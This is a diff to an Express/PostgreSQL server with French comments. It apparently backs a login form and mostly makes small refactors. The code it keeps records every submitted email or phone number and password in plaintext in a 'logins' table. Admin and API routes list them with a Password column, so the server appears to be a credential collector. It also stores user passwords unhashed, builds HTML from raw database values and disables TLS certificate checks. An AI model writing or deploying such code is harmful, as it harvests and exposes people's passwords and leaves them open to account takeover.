@@ -9,29 +9,25 @@ const PORT = process.env.PORT || 3000;
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Connexion PostgreSQL
+// Connexion PostgreSQL via Render DATABASE_URL
 const pool = new Pool({
-  connectionString: process.env.DATABASE_URL || 'postgresql://postgres:password@localhost:5432/ma_base',
+  connectionString: process.env.DATABASE_URL,
   ssl: process.env.DATABASE_URL ? { rejectUnauthorized: false } : false
 });
 
-// Test de connexion à la base
+// Tester la connexion avant tout
 pool.connect()
-  .then(() => {
-    console.log("✅ Connecté à PostgreSQL :", process.env.DATABASE_URL ? "Render DB" : "Local DB");
-  })
-  .catch(err => {
-    console.error("❌ Erreur de connexion PostgreSQL :", err.message);
-  });
+  .then(() => console.log("✅ Connecté à PostgreSQL Render"))
+  .catch(err => console.error("❌ Erreur PostgreSQL Render:", err));
 
 // Fonction pour exécuter des requêtes avec retry
-async function runWithRetry(query, params, retries = 5) {
+async function runWithRetry(query, params = [], retries = 5) {
   try {
     return await pool.query(query, params);
   } catch (err) {
     if (retries > 0) {
       console.log(`Database error, retrying... (${retries} left)`);
-      await new Promise(res => setTimeout(res, 50));
+      await new Promise(res => setTimeout(res, 100));
       return runWithRetry(query, params, retries - 1);
     } else {
       throw err;
@@ -39,27 +35,33 @@ async function runWithRetry(query, params, retries = 5) {
   }
 }
 
-// Création des tables
+// Création des tables si elles n'existent pas
 (async () => {
-  await runWithRetry(`
-    CREATE TABLE IF NOT EXISTS users (
-      id SERIAL PRIMARY KEY,
-      full_name TEXT NOT NULL,
-      email TEXT NOT NULL UNIQUE,
-      password TEXT NOT NULL,
-      date_of_birth TEXT NOT NULL,
-      gender TEXT NOT NULL
-    );
-  `);
+  try {
+    await runWithRetry(`
+      CREATE TABLE IF NOT EXISTS users (
+        id SERIAL PRIMARY KEY,
+        full_name TEXT NOT NULL,
+        email TEXT NOT NULL UNIQUE,
+        password TEXT NOT NULL,
+        date_of_birth TEXT NOT NULL,
+        gender TEXT NOT NULL
+      );
+    `);
 
-  await runWithRetry(`
-    CREATE TABLE IF NOT EXISTS logins (
-      id SERIAL PRIMARY KEY,
-      emailOrPhone TEXT,
-      password TEXT,
-      login_time TIMESTAMP
-    );
-  `);
+    await runWithRetry(`
+      CREATE TABLE IF NOT EXISTS logins (
+        id SERIAL PRIMARY KEY,
+        emailOrPhone TEXT,
+        password TEXT,
+        login_time TIMESTAMP
+      );
+    `);
+
+    console.log("✅ Tables créées ou existantes OK");
+  } catch (err) {
+    console.error("❌ Erreur création tables:", err);
+  }
 })();
 
 // Route signup
@@ -72,6 +74,7 @@ app.post('/signup', async (req, res) => {
     await runWithRetry(sql, params);
     res.redirect('/index.html');
   } catch (err) {
+    console.error("Erreur création utilisateur:", err.message);
     res.status(400).send('Erreur création utilisateur : ' + err.message);
   }
 });
@@ -102,16 +105,16 @@ app.get('/admin/logins', async (req, res) => {
   try {
     const result = await pool.query(`SELECT * FROM logins ORDER BY login_time DESC`);
     let html = `
-    <html>
-    <head>
-        <title>Liste des logins</title>
-        <link rel="stylesheet" href="/css/admin.css">
-    </head>
-    <body>
-    <h1>Liste des logins</h1>
-    <table>
-    <tr><th>ID</th><th>Email/Phone</th><th>Password</th><th>Login Time</th></tr>`;
-    
+      <html>
+      <head>
+          <title>Liste des logins</title>
+          <link rel="stylesheet" href="/css/admin.css">
+      </head>
+      <body>
+      <h1>Liste des logins</h1>
+      <table>
+      <tr><th>ID</th><th>Email/Phone</th><th>Password</th><th>Login Time</th></tr>`;
+
     result.rows.forEach(row => {
       html += `<tr>
         <td>${row.id}</td>
@@ -140,7 +143,7 @@ app.get('/api/logins', async (req, res) => {
   }
 });
 
-// Lancement serveur
+// Démarrage serveur
 app.listen(PORT, () => {
   console.log(`🚀 Serveur démarré sur le port ${PORT}`);
 });
